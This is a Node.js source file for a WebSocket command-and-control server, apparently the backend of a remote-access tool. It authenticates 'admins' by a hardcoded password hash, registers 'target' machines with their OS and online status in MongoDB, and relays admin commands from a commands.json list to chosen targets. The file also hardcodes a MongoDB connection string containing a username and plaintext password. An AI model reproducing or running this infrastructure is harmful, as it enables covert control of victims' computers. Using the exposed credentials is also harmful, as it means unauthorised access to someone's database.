//module imports
const websocket = require('ws'); //websocket
const mongoose = require('mongoose'); //mongodb database

//custom imports
const newDevice = require('./custom/connectionSchema'); //mongodb schema
const commands = require('./custom/commands.json'); //commands json file

//values
const  PORT = process.env.PORT || 80; //websocket port
const password = "b2d627894807d0af925ba02a15e8d30d314cbf21cfbc4137f54da282c3360ff1"; //sha256 hash password
const mongoDBConnectionString = 'mongodb+srv://xv:Eight8nine9@cluster0.gfv8vjt.mongodb.net/collections'; //connection string for mongodb

//initializations
const wss = new websocket.WebSocketServer({port:PORT}); //websocket init
mongoose.connect(mongoDBConnectionString,{});// connect mongodb

//store
const admins ={}; //store admin sockets
const targets = {}; //store target sockets

///match password hash
function matchPassword(pass){return (pass === password)?true:false} //return true if password is correct else false

//send notification to all admins available
function notifyAdmin(con,user,data){Object.keys(admins).map(key=>admins[key].socket.send(JSON.stringify({type:"nt",con:con,user:user,dat:data?data:"no value"})))};

//add to admin or target
async function handleSocket(url,socket){
    //adding socket to admin if correct password is present else add to target
    if(url.admin === true && matchPassword((url.password)?url.password:"") === true){
        admins[url.username] = {socket:socket} //adding to admins
        console.log("admin connected "+url.username);console.log(Object.keys(admins).length)//log
    }else{
        //check if target is existing on database
        try{
            const data = await newDevice.findOne({uniqueid:url.username});
            if(data == null){
                const targetdata = newDevice.create({uniqueid:url.username,os:url.os,online:true,lastTime:new Date().getTime(),date:new Date().getTime()});
                targets[url.username] = {socket:socket,id:targetdata._id} //adding target
                    notifyAdmin(true,url.username,targetdata._id) //sending notification to admin
            }
            else{
                id = data.id;
                newDevice.findOneAndUpdate({ _id: id }, { $set: { online:true} }, { new: true })
                targets[url.username] = {socket:socket,id:data._id}
                notifyAdmin(true,url.username,data._id)
            }
        }catch(e){
            console.log(e) //log
        }
    }
}


//handle websocket messages
function handleMessages(data,url,socket){
    let response;

    //check if response is able to json parse
    try{response = JSON.parse(data)}catch(error){response = false}

    if(response){
        //request from admin to send to target
        if(response.type ==="req" && url.admin === true && matchPassword(url.password)===true){
            console.log(response)
            const to = response.to //target id
            const data  = response.data //content
            const from =Object.keys(admins).filter(key => admins[key].socket === socket);
            //if the "to" is available forward it to it, else 
            if(targets[to]){targets[to].socket.send(JSON.stringify({"from":from[0],"data":data}))}else{
            admins[from].socket.send(JSON.stringify({type:"err",target:to,content:"n/a"}))
            }
        }
        //response from target to send to admin
        else if(response.type === "res"){
            const from =Object.keys(targets).filter(key => targets[key].socket === socket);
            const to = response.to;
            const data = response.data;
            if(admins[to]){admins[to].socket.send(JSON.stringify({"type":"dat","from":from[0],"data":data}))}else{
                console.log("admin not found",from[0])
            }
        }
        //request from admin to get target details from database
        else if(response.type === "tgt" && url.admin == true && matchPassword(url.password)===true){
            newDevice.find({}).then((data)=>{
                socket.send(JSON.stringify(data))
            })
        }
        //request from admin to get commands details from commands.json
        else if(response.type === "cmd" && url.admin == true && matchPassword(url.password)===true ){
            socket.send(JSON.stringify(commands))
        }
    }
}

function handleCloseEvent(url){
    //check if admin
    if(url.admin  === true && matchPassword((url.password)?url.password:"") === true){
        delete admins[url.username]
        console.log(`admin length : ${Object.keys(admins).length}`)
    }else if(url.admin ===false || !matchPassword((url.password)?url.password:"")){
        newDevice.findOneAndUpdate({ _id: targets[url.username].id.toString() }, { $set: { online:false} }, { new: true });
        delete targets[url.username]
        notifyAdmin(false,url.username)
        console.log(`target  length : ${Object.keys(targets).length}`)
    }
}


//websocket handle on connection event
function handleConnection(socket,request){
    let url;

    //check if url values are able to jsonParse
    try{url = JSON.parse(decodeURIComponent(request.url.replace('/','')))}catch(error){url = null};

    handleSocket(url,socket); //add socket to admin or target

    socket.on('message',message=>handleMessages(message,url,socket)); //handle messages

    socket.on('close',()=>handleCloseEvent(url)); //handle socket close event  
}

//wss on connection main event
wss.on('connection',handleConnection);
